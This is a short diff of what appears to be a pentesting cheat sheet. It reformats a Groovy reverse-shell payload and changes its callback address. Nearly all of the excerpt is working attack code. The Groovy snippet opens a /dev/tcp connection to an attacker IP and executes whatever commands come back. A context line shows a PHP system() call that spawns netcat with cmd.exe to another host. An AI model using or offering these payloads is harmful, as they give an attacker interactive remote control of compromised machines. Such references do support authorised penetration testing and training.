@@ -188,7 +188,10 @@ system('netcat.exe -vv 192.168.4.178 443 -e cmd.exe');
 
 ```bash
 # Linux
-r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]) p.waitFor()
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.45.204/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
 # Windows
 def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");
 # Windows
